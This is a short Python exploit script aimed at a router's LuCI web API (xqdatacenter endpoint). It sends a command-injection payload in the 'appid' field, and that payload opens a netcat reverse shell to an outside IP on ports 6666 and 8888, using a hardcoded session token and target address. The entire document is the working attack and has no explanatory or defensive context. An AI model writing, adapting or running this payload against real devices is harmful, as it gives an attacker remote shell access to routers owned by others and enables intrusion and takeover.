import requests

server_ip = "172.17.0.6"
client_ip = "222.20.126.137"
token = "86b85ab700a915ee2384748e8639722a"

nc_shell = ";nc {0} 6666 | /bin/sh | nc {0} 8888;".format(client_ip)

res = requests.post("http://{}/cgi-bin/luci/;stok={}/api/xqdatacenter/request".format(server_ip, token), 
                    data={'payload':'{"api":629, "appid":"' + nc_shell + '"}'})

print(res.text)
